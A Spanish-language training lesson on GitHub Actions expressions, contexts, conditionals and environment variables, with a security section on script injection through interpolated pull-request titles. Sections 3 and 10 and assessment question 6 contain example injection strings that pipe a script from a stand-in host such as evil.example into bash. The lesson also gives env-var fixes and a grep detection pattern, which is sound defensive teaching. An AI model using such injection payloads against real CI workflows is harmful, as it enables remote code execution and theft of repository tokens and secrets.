# Lección: Sintaxis, expresiones y contextos en GitHub Actions

> **ID:** `gha-02-syntax-expressions-and-contexts` · **Nivel:** fundamentos · **Duración:** 4 h
> **Prerrequisitos:** `gha-01-model-and-first-workflow`.

---

## 1. Introducción intuitiva

En `gha-01` escribiste tu primer workflow: dos jobs, cuatro steps, todo encadenado. Fue estático: si tocabas cualquier archivo, corría exactamente lo mismo.

En la vida real los workflows son **dinámicos**:

- "Solo deploya si el push fue a `main`."
- "Si el job de tests falló, igualmente sube los logs."
- "Si la rama empieza con `release/`, corre el pipeline largo; si no, el corto."
- "Reutiliza este step para cada versión de Python en la matriz."

Esa dinámica se expresa con tres piezas que son el **cerebro del YAML**:

1. **Contextos** — colecciones de datos que GitHub expone al workflow (quién disparó el run, en qué rama, qué step corrió antes, etc.).
2. **Expresiones** `${{ ... }}` — mini-lenguaje para leer esos contextos, compararlos, combinarlos y producir strings o booleanos.
3. **`if:`** — el único lugar donde una expresión decide si un job o step corre.

```
┌───────────────────────────────────────────────┐
│ Evento llega: push a refs/heads/main          │
└───────────────┬───────────────────────────────┘
                │ GitHub rellena contextos:
                ▼
┌───────────────────────────────────────────────┐
│  github.event_name   = "push"                 │
│  github.ref          = "refs/heads/main"      │
│  github.ref_name     = "main"                 │
│  github.sha          = "a1b2c3..."            │
│  github.actor        = "octocat"              │
└───────────────┬───────────────────────────────┘
                │ Evalúa expresiones del YAML
                ▼
┌───────────────────────────────────────────────┐
│  if: ${{ github.ref == 'refs/heads/main' }}   │
│      → true  → el job corre                   │
└───────────────────────────────────────────────┘
```

Y hay una **cuarta pieza oscura** que vamos a desactivar como arma: cuando ese `${{ ... }}` aparece **dentro de `run:`**, GitHub lo expande **antes** de pasar el string al shell. Si el valor viene de un atacante (título de un PR, cuerpo de un issue), tienes RCE *gratis*. Lo veremos en la sección 10.

---

## 2. Fundamentos

### 2.1 Contextos: qué son y cuáles existen

Un **contexto** es un objeto (map) que GitHub inyecta en el workflow. Se accede con notación de punto: `github.actor`, `env.MY_VAR`, `steps.build.outputs.hash`.

Los contextos canónicos:

| Contexto | Contenido típico | Disponible en |
|----------|------------------|---------------|
| `github` | Metadatos del run: `event_name`, `ref`, `ref_name`, `sha`, `actor`, `repository`, `workflow`, `event` (payload completo). | En todas partes. |
| `env` | Variables de entorno definidas en el YAML (`env:` a nivel workflow/job/step). | Cualquier `if:` / `run:` / `with:`. |
| `vars` | Variables **no sensibles** configuradas en Settings → Variables (repo/env/org). | Igual que `env`. |
| `secrets` | Secretos configurados en Settings → Secrets. **Redacted** automáticamente en logs. | En steps y en algunos `if:` (no en `job.if:` top-level en todos los casos). |
| `inputs` | Inputs del `workflow_dispatch` o del `workflow_call`. | En el workflow llamado. |
| `needs` | Outputs y resultado de jobs listados en `needs:`. | Jobs que declaran `needs:`. |
| `job` | Estado y servicios del job actual. | Dentro del job (p. ej. `job.status`). |
| `runner` | Metadatos del runner: `runner.os`, `runner.arch`, `runner.temp`. | Dentro de un step. |
| `steps` | Outputs y conclusión de steps **del mismo job** anteriores con `id:`. | Steps posteriores del mismo job. |
| `matrix` | Variables de la fila de matriz actual (`matrix.python-version`). | Steps dentro de un job con `strategy.matrix`. |
| `strategy` | Metadatos de la estrategia (`strategy.job-index`, `strategy.fail-fast`). | Dentro de un job con `strategy:`. |

**Regla clave**: no todos los contextos están disponibles en todas las posiciones del YAML. Por ejemplo, `secrets.*` **no se puede referenciar en `job.if:` a nivel top** (porque la evaluación ocurre antes de que GitHub decida enviarle secrets al runner). `steps.*` solo existe para steps *con `id:`* y *posteriores* al referenciado.

### 2.2 Expresiones `${{ ... }}`

La sintaxis es `${{ <expr> }}`. Dentro del delimitador tienes:

- **Literales**: `null`, `true`, `false`, números (`42`, `3.14`), strings con comillas simples (`'main'`).
- **Operadores**: `==`, `!=`, `<`, `<=`, `>`, `>=`, `&&`, `||`, `!`, `(...)`.
- **Index**: `github.event.pull_request.title`, `matrix['python-version']`.
- **Funciones**: `contains(github.event.head_commit.message, 'skip-ci')`.

Las comparaciones son **case-insensitive para strings**. El operador `||` devuelve el **primer operando truthy** (como en JS), útil para defaults: `${{ inputs.name || 'anon' }}`.

Un valor es *truthy* si **no** es `null`, `false`, `0`, `""`, `NaN`, ni un array/map vacío.

### 2.3 Funciones integradas

Todas devuelven string o bool.

| Función | Para qué |
|---------|----------|
| `contains(haystack, needle)` | `true` si `needle` está en el string o array `haystack`. |
| `startsWith(s, prefix)` / `endsWith(s, suffix)` | Prefijo/sufijo. |
| `format('hello {0} and {1}', 'a', 'b')` | Sustitución posicional. |
| `toJSON(value)` | Serializa un contexto completo (útil para debug: `echo '${{ toJSON(github) }}'`). |
| `fromJSON(string)` | Parsea un string JSON a objeto; típico para pasar listas entre jobs. |
| `hashFiles('**/poetry.lock')` | Hash SHA-256 de los archivos que matchean el glob (clave de caché estable). |
| `join(array, sep)` | Une un array con separador. |

Y las **status check functions** —solo válidas en `if:`—:

- `success()` — true si todos los steps anteriores pasaron (es el **default implícito** si no pones `if:`).
- `failure()` — true si algún step anterior falló.
- `cancelled()` — true si el run fue cancelado.
- `always()` — true siempre, incluso si fue cancelado. **Es la única forma de ejecutar algo en cualquier caso.**

### 2.4 `if:` en jobs y steps

```yaml
jobs:
  deploy:
    if: ${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        id: tests
        run: pytest
      - name: Upload logs even on failure
        if: ${{ failure() }}
        uses: actions/upload-artifact@v4
        with:
          name: logs
          path: logs/
      - name: Always clean up
        if: ${{ always() }}
        run: rm -rf /tmp/work
```

Notas finas:

- En `if:` el `${{ ... }}` es **opcional** sintácticamente, pero recomendable por claridad: `if: github.ref == 'refs/heads/main'` también funciona.
- Un `if:` que evalúa a `false` marca el step/job como **skipped** (no failed).
- Si no hay `if:`, el default implícito es `if: success()`. Por eso un step que *necesita* correr siempre debe decirlo con `if: ${{ always() }}`.

### 2.5 `env:` a tres niveles

```yaml
env:
  LOG_LEVEL: info           # (A) workflow-level

jobs:
  build:
    env:
      LOG_LEVEL: debug      # (B) job-level — override de A dentro del job
    runs-on: ubuntu-latest
    steps:
      - name: Noisy step
        env:
          LOG_LEVEL: trace   # (C) step-level — override de B dentro del step
        run: echo "level=$LOG_LEVEL"   # imprime "trace"
      - name: Quiet step
        run: echo "level=$LOG_LEVEL"   # imprime "debug" (hereda del job)
```

Precedencia: **step > job > workflow**. Dentro de `run:` las variables se consumen como env vars normales del shell (`$NAME`); dentro de `with:` o `if:` como contexto (`${{ env.NAME }}`).

### 2.6 `continue-on-error` y `timeout-minutes`

- `continue-on-error: true` en un step: si falla, el **job sigue** y el step aparece en verde (con asterisco). Útil para checks informativos (p. ej. un linter en modo advisory).
- `continue-on-error: true` en un job: si falla, el workflow **sigue pudiendo ser exitoso** (jobs que dependan de él verán `needs.X.result == 'failure'` pero no se abortan).
- `timeout-minutes: N`: límite duro. Default del job es **360** (6 h). Reduce agresivamente para no quemar minutos en bucles infinitos (`timeout-minutes: 10` para la mayoría de jobs).

---

## 3. Modelo mental correcto

El modelo es **dos pasadas**:

```
┌─────────────────────────────────────────────────────────┐
│ Pasada 1 — "Pre-eval" (en el plano de control GitHub)   │
│  - Lee el YAML.                                         │
│  - Expande todas las expresiones ${{ ... }} que puede   │
│    con los contextos ya disponibles.                    │
│  - Decide si cada job/step correrá (if:).               │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│ Pasada 2 — Ejecución (en el runner)                     │
│  - El runner recibe los steps YA EXPANDIDOS.            │
│  - Ejecuta el shell con el script "literal" resultante. │
└─────────────────────────────────────────────────────────┘
```

**Implicación crítica**: cuando pones `${{ github.event.pull_request.title }}` dentro de `run:`, GitHub **substituye el string literal en el script antes de ejecutarlo**. Si el título es `foo"; curl evil.sh | bash; "`, el shell ve un comando compuesto. Esto no es un bug: es la semántica documentada. Es por eso que la mitigación correcta es **no interpolar jamás** y pasar el valor como *env var*, que el shell trata como dato opaco.

---

## 4. Entidades y relaciones

```
┌─────────────────────────────────────────────────────┐
│  Workflow                                           │
│  ├── env: (A)                                       │
│  └── jobs:                                          │
│       ├── job "build"                               │
│       │    ├── if: ${{ github.ref == '...' }}       │
│       │    ├── env: (B)                             │
│       │    └── steps:                               │
│       │         ├── step "install"  id: install     │
│       │         │     outputs → steps.install.outputs
│       │         └── step "test"                     │
│       │               if: ${{ steps.install.outcome == 'success' }}
│       │               env: (C)                      │
│       └── job "deploy"                              │
│            needs: [build]                           │
│            if: ${{ needs.build.result == 'success' }}
└─────────────────────────────────────────────────────┘
```

Tres grafos coexisten:

- **Grafo de dependencias de datos**: `steps.X.outputs.Y` → consumidor; `needs.X.outputs.Y` → consumidor.
- **Grafo de dependencias de orden**: `needs:` para jobs; implícito top-down para steps.
- **Grafo de decisiones**: `if:` → booleano → ejecutar/skip.

---

## 5. Primeros pasos operativos

Mira `examples/01-conditionals/` y `examples/02-contexts-dump/`. Dos recetas que vas a usar siempre:

**Imprimir el payload del evento** cuando no sabes qué llega:

```yaml
- name: Dump event
  env:
    EVENT_JSON: ${{ toJSON(github.event) }}
  run: echo "$EVENT_JSON"
```

Fíjate: usamos `env:` + `"$EVENT_JSON"` entre comillas. Nunca `echo '${{ toJSON(github.event) }}'` directo en `run:` — sería injection si el payload trae comillas.

**Condicionar por rama**:

```yaml
if: ${{ github.ref == 'refs/heads/main' }}
```

**Condicionar por evento + fuerza bruta**:

```yaml
if: ${{ github.event_name == 'push' && contains(github.event.head_commit.message, '[deploy]') }}
```

**Correr siempre al final** (cleanup, upload de logs):

```yaml
if: ${{ always() }}
```

---

## 6. Operaciones principales

### 6.1 Pasar un output entre steps

```yaml
- name: Compute hash
  id: hash
  run: |
    H=$(sha256sum README.md | cut -d' ' -f1)
    echo "sha=$H" >> "$GITHUB_OUTPUT"
- name: Use it
  run: echo "hash was ${{ steps.hash.outputs.sha }}"
```

El canal es el fichero `$GITHUB_OUTPUT` (una línea `key=value` por output). La vieja sintaxis `::set-output name=X::Y` **está deprecada** por razones de seguridad.

### 6.2 Pasar un output entre jobs

```yaml
jobs:
  gen:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
  use:
    needs: gen
    runs-on: ubuntu-latest
    steps:
      - run: echo "got ${{ needs.gen.outputs.version }}"
```

### 6.3 Convertir una lista string → array JSON

```yaml
- id: list
  run: echo 'items=["a","b","c"]' >> "$GITHUB_OUTPUT"
- run: echo "first=${{ fromJSON(steps.list.outputs.items)[0] }}"
```

### 6.4 Clave de caché con hash de lockfile

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('**/requirements.txt') }}
```

Esto se cubre a fondo en `gha-07`. Aquí nos importa que `hashFiles()` cambia solo cuando cambia el lockfile.

---

## 7. Fallos típicos y debugging

| Síntoma | Causa | Fix |
|---------|-------|-----|
| `The workflow is not valid. Context 'secrets' is not available.` | Usaste `secrets.*` en un `if:` a nivel job sin environment, o en una expresión de top-level. | Mueve el chequeo a step-level o usa `vars.*` para booleanos de feature flag. |
| El step que debía correr "siempre" no corre tras un fallo | Falta `if: ${{ always() }}`; el default implícito es `if: success()`. | Añade `if: always()`. |
| `${{ github.ref == 'main' }}` siempre `false` | `github.ref` vale `refs/heads/main`, no `main`. | Compara contra `refs/heads/main` o usa `github.ref_name == 'main'`. |
| Output vacío entre steps | El step emisor no tiene `id:`, o no escribió a `$GITHUB_OUTPUT`. | Añade `id:`; verifica el redireccionamiento con `>>`. |
| El workflow corre dos veces en PR | Está disparado por `push` y `pull_request`; cada uno genera un run. | Filtra con `on.push.branches` o usa `concurrency:` (ver `gha-06`). |
| Interpolación da `***` en el log | Es un `secret` y GitHub lo redacta. | Deseado. Si necesitas depurar, imprime `length` o `substring`, nunca el valor. |
| `syntax error near unexpected token` dentro de un `run:` tras un PR | **Script injection**: el título/body del PR contenía caracteres de shell. | Pasar por `env:` y usar `"$VAR"` entre comillas dobles. |

---

## 8. Buenas prácticas

- **Nunca** interpolar `github.event.*.title`, `.body`, `.head.ref`, `.head.label`, `.comment.body`, ni ningún dato de usuario, **directamente** en `run:`. Pasa por `env:`.
- Pon `if: ${{ always() }}` explícito en steps de cleanup/upload de logs.
- Define `timeout-minutes` razonable (10 para la mayoría de jobs; 30 para builds grandes).
- Usa `continue-on-error: true` solo para checks informativos; marca el step claramente en el `name:`.
- `env:` a nivel workflow para constantes compartidas (`PYTHON_VERSION: "3.12"`); step-level solo para overrides locales.
- Para outputs: siempre asigna `id:` al step emisor; nombra outputs en `snake_case` o `kebab-case` consistente.
- Imprime el contexto completo con `${{ toJSON(github) }}` solo en workflows de debug temporales; borra después (es ruido en logs).

---

## 9. Antipatrones concretos

| Antipatrón | Por qué es malo | Alternativa |
|------------|-----------------|-------------|
| `run: echo "${{ github.event.pull_request.title }}"` | **RCE** si el título contiene `"; <cmd>; "`. | `env: TITLE: ${{ github.event.pull_request.title }}` + `run: echo "$TITLE"`. |
| `if: ${{ github.ref == 'main' }}` | Nunca true: `github.ref` es `refs/heads/main`. | `github.ref == 'refs/heads/main'` o `github.ref_name == 'main'`. |
| `if: success() && failure()` | Imposible, siempre false. | Pensar la lógica: ¿quieres `always()`? |
| Reusar el mismo `id:` en dos steps | El segundo "pisa" el output del primero (comportamiento no definido). | IDs únicos por job. |
| `continue-on-error: true` en el job de tests | Esconde regresiones; el deploy correrá aunque falle test. | Déjalo fallar; usa `needs.test.result` en el job de deploy. |
| Expandir secret en `env:` del workflow para "ahorrar código" | El secret aparece en el entorno de **todos** los steps; superficie de leak enorme. | Pasa el secret solo al step que lo necesita (`step.env:`). |
| `timeout-minutes:` ausente | Un bug puede quemar 6 h × 20 jobs de matriz. | Default razonable (10–30). |

---

## 10. Interpolación insegura: anatomía y arreglos

Esta sección es la razón de ser del módulo. Lee despacio.

### 10.1 El patrón vulnerable

```yaml
on:
  pull_request:
    types: [opened, edited, synchronize]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Greet contributor
        run: |
          echo "Thanks for the PR titled: ${{ github.event.pull_request.title }}"
```

Un atacante abre un PR con título:

```
innocent"; curl -s https://evil.example/x.sh | bash; echo "
```

GitHub expande el `${{ ... }}` **literalmente** en el script antes de ejecutarlo. El shell ve:

```bash
echo "Thanks for the PR titled: innocent"; curl -s https://evil.example/x.sh | bash; echo ""
```

Resultado: ejecución remota en el runner con el `GITHUB_TOKEN` del repo. Si el workflow corre bajo `pull_request_target` (ver `gha-03`) además hay *secrets* en el entorno. Esto no es teórico: ha ocasionado incidentes públicos reales.

### 10.2 Por qué pasa

Porque la expansión de `${{ ... }}` es **pre-pass textual** (ver sección 3). El shell no ve la interpolación; ve el string final. No hay escape automático: GitHub no sabe en qué shell corre ni qué caracteres son peligrosos para cada uno.

### 10.3 Arreglo #1 — Env var

```yaml
- name: Greet contributor
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR titled: $PR_TITLE"
```

El valor del título ya no es parte del script; es un valor de env var que el shell trata como **dato opaco**. El comillado doble `"$PR_TITLE"` previene re-interpretación. Esta es la vía por defecto.

### 10.4 Arreglo #2 — `actions/github-script`

```yaml
- name: Greet contributor
  uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      console.log(`Thanks for the PR titled: ${title}`);
```

Aquí el título viaja dentro del *objeto JavaScript* `context.payload`, no en el string del script. No hay fase textual intermedia que pueda ser envenenada.

### 10.5 Qué campos son peligrosos

Cualquier campo controlable por el autor del evento:

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`, `.head.repo.description`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`, `github.event.review.body`
- `github.event.head_commit.message`, `.author.name`, `.author.email`
- `github.event.workflow_run.head_branch` (puede venir de un fork)
- Nombres de ramas: `github.ref_name` también si vino de un fork

Como regla operativa: **todo lo que esté bajo `github.event.*` que no sea un SHA, un ID numérico o un enum documentado se considera no confiable.**

### 10.6 Detección

Un grep simple detecta el 95% de los casos:

```bash
grep -nE '\$\{\{\s*github\.event\.[^}]*\.(title|body|message|name|email|ref|label|description)' .github/workflows/*.yml
```

Herramientas que automatizan esto: `actionlint` (regla `expression`), `zizmor`, `octoscan`. En CI robusto se corre en PR. Verás esto profundizado en `gha-13-security-hardening`.

---

## 11. Casos de uso típicos

- **Deploy solo en main**: `if: ${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}` en el job de deploy.
- **Skip CI con flag en commit**: `if: ${{ !contains(github.event.head_commit.message, '[skip ci]') }}` a nivel workflow (via early-exit step) o job.
- **Correr tests pesados solo en PR a main**: `if: ${{ github.event.pull_request.base.ref == 'main' }}`.
- **Fallback de input**: `${{ inputs.environment || 'staging' }}`.
- **Cache estable**: `key: deps-${{ runner.os }}-${{ hashFiles('**/poetry.lock') }}`.
- **Upload de logs siempre**: step de upload con `if: ${{ always() }}`.
- **Advisory lint**: step `continue-on-error: true` que corre lint "en modo warning" sin romper el build.

---

## 12. Síntesis + Evaluación

### Síntesis

- **Contexto** = datos que GitHub expone. **Expresión** = cómo los lees. **`if:`** = cómo decides.
- La expansión es **textual y previa a la ejecución**. Esa es la fuente del script injection.
- `env:` a tres niveles con precedencia **step > job > workflow**.
- Status functions (`success/failure/cancelled/always`) solo en `if:`.
- La regla de oro de seguridad: **nunca interpolar input de usuario en `run:`**. Pasa por `env:` + `"$VAR"`.

### Preguntas de evaluación

1. **Modelo**: explica con tus palabras la secuencia *evento → contextos poblados → expresiones evaluadas → decisiones `if:` → steps ejecutados*. ¿En qué pasada se expande `${{ ... }}`?

2. **Contextos**: ¿por qué `secrets.*` no puede usarse en todas las posiciones de un `if:`? ¿Qué pasa si lo intentas?

3. **Operadores**: `${{ inputs.name || 'anon' }}` — ¿qué devuelve si `inputs.name` es `""`? ¿Y si es `null`? ¿Y si es `"0"`?

4. **Status**: diferencia entre `if: success()`, no poner `if:`, y `if: always()`. Da un caso de uso de cada uno.

5. **Env a tres niveles**: en el ejemplo de la sección 2.5, ¿qué imprime cada `echo` y por qué? Si en el workflow-level pones `env.LOG_LEVEL: info` y en una matriz `matrix.log` sobrescribe por fila, ¿cómo mapearías matriz → env sin colisión?

6. **Script injection — el enunciado del módulo**: te dan este snippet:
   ```yaml
   - run: echo "PR title is ${{ github.event.pull_request.title }}"
   ```
   (a) Da un título de PR que ejecute `curl evil | sh`.
   (b) Explica *por qué* GitHub permite esta expansión.
   (c) Da **dos** arreglos distintos: con `env:` y con `actions/github-script`.

7. **Outputs**: ¿por qué GitHub deprecó `::set-output name=X::Y` a favor de `$GITHUB_OUTPUT`? Pista: tiene que ver con el mismo problema de injection, aplicado a logs.

8. **Timeouts**: ¿por qué `timeout-minutes` por defecto es tan alto (6 h)? ¿Cuál pondrías para un job típico de tests Python y por qué?
